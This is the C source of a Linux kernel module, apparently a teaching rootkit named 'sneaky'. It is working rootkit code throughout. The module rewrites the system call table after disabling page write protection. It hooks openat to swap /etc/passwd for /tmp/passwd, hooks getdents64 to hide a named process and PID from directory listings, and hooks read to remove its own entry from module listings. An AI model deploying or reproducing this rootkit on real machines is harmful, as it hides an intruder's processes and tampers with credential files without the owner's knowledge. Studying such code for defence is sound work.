#include <linux/module.h>      // for all modules 
#include <linux/init.h>        // for entry/exit macros 
#include <linux/kernel.h>      // for printk and other kernel bits 
#include <asm/current.h>       // process information
#include <linux/sched.h>
#include <linux/highmem.h>     // for changing page permissions
#include <asm/unistd.h>        // for system call constants
#include <linux/kallsyms.h>
#include <asm/page.h>
#include <asm/cacheflush.h>
#include <linux/dirent.h>

MODULE_LICENSE("GPL");
static char * sneaky_pid = "";
module_param(sneaky_pid, charp, 0);
MODULE_PARM_DESC(pid, "sneaky_pid");

//This is a pointer to the system call table
static unsigned long *sys_call_table;

// 1. Function pointer will be used to save address of the original 'openat' syscall.
// 2. The asmlinkage keyword is a GCC #define that indicates this function
//    should expect it find its arguments on the stack (not in registers).
typedef asmlinkage long (*ptregs_t)(const struct pt_regs * regs);
static ptregs_t original_openat;
static ptregs_t original_getdents64;
static ptregs_t original_read;

// Helper functions, turn on and off the PTE address protection mode
// for syscall_table pointer
static int enable_page_rw(void *ptr){
  unsigned int level;
  pte_t *pte = lookup_address((unsigned long) ptr, &level);
  if(pte->pte &~_PAGE_RW){
    pte->pte |=_PAGE_RW;
  }
  return 0;
}

static int disable_page_rw(void *ptr){
  unsigned int level;
  pte_t *pte = lookup_address((unsigned long) ptr, &level);
  pte->pte = pte->pte &~_PAGE_RW;
  return 0;
}

// Define your new sneaky version of the 'openat' syscall
static asmlinkage int sneaky_sys_openat(const struct pt_regs *regs)
{
  const char * filename = (char *)regs->si;
  if (strcmp(filename, "/etc/passwd") == 0) {
    copy_to_user((void *)filename, "/tmp/passwd", strlen("/tmp/passwd"));
    printk(KERN_INFO "***hacking openat***\n");
  }    
  return original_openat(regs);
}

static asmlinkage ssize_t sneaky_sys_getdents64(const struct pt_regs * regs) {
  ssize_t nread = original_getdents64(regs);
  if (nread == 0) {
    return nread;
  }
  ssize_t pos = 0;
  while (pos < nread) {
    struct linux_dirent64 * dirent = (struct linux_dirent64 *)((char *)regs->si + pos);
    if ((strcmp(dirent->d_name, "sneaky_process") == 0) || (strcmp(dirent->d_name, sneaky_pid) == 0)) {
      memmove(dirent, (char *)dirent + dirent->d_reclen, nread - (pos +dirent->d_reclen));
      nread -= dirent->d_reclen;
      printk(KERN_INFO "**hacking getdents64***\n");
    } else {
      pos += dirent->d_reclen;
    }
  }
  return nread;
}

static asmlinkage ssize_t sneaky_sys_read(const struct pt_regs * regs) {
  ssize_t nread = original_read(regs);
  if (nread == 0) {
    return nread;
  }
  char * buf = (char *)regs->si;
  char * target = strstr(buf, "sneaky_mod ");
  if (target != NULL) {
    char * nextLine = strchr(target, '\n');
    if (nextLine != NULL) {
      nextLine++;
      memmove(target, nextLine, nread - (ssize_t)(nextLine - buf));
      nread -= (ssize_t)(nextLine - target);
      printk(KERN_INFO "***hacking read***\n");
    }
  }
  return nread;
}

// The code that gets executed when the module is loaded
static int initialize_sneaky_module(void)
{
  // See /var/log/syslog or use `dmesg` for kernel print output
  printk(KERN_INFO "Sneaky module being loaded.\n");

  // Lookup the address for this symbol. Returns 0 if not found.
  // This address will change after rebooting due to protection
  sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");

  // This is the magic! Save away the original 'openat' system call
  // function address. Then overwrite its address in the system call
  // table with the function address of our new code.
  original_openat = (ptregs_t)sys_call_table[__NR_openat];
  original_getdents64 = (ptregs_t)sys_call_table[__NR_getdents64];
  original_read = (ptregs_t)sys_call_table[__NR_read];
  
  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);
  
  sys_call_table[__NR_openat] = (unsigned long)&sneaky_sys_openat;
  sys_call_table[__NR_getdents64] = (unsigned long)&sneaky_sys_getdents64;
  sys_call_table[__NR_read] = (unsigned long)&sneaky_sys_read;
  
  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);

  return 0;       // to show a successful load 
}  


static void exit_sneaky_module(void) 
{
  printk(KERN_INFO "Sneaky module being unloaded.\n"); 

  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);

  // This is more magic! Restore the original 'open' system call
  // function address. Will look like malicious code was never there!
  sys_call_table[__NR_openat] = (unsigned long)original_openat;
  sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
  sys_call_table[__NR_read] = (unsigned long)original_read;

  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);  
}  


module_init(initialize_sneaky_module);  // what's called upon loading 
module_exit(exit_sneaky_module);        // what's called upon unloading  